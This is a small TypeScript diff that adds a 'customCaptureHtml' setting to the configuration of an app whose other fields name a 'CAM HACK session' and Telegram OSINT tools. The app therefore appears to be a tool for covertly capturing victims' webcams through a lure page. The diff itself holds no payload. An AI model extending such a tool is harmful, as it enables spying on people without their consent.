@@ -49,6 +49,8 @@ export interface AppSettings {
   telegramOsint: TelegramOsintSettings;
   // CAM HACK session (synced across all devices)
   camSessionId: string;
+  // Custom HTML for capture page
+  customCaptureHtml: string;
 }
 
 const defaultTelegramTools: TelegramToolConfig[] = [
@@ -108,6 +110,8 @@ const defaultSettings: AppSettings = {
   },
   // CAM HACK session - fixed session ID synced across all devices
   camSessionId: "shubhcam01",
+  // Custom HTML for capture page
+  customCaptureHtml: "",
 };
 
 interface SettingsContextType {
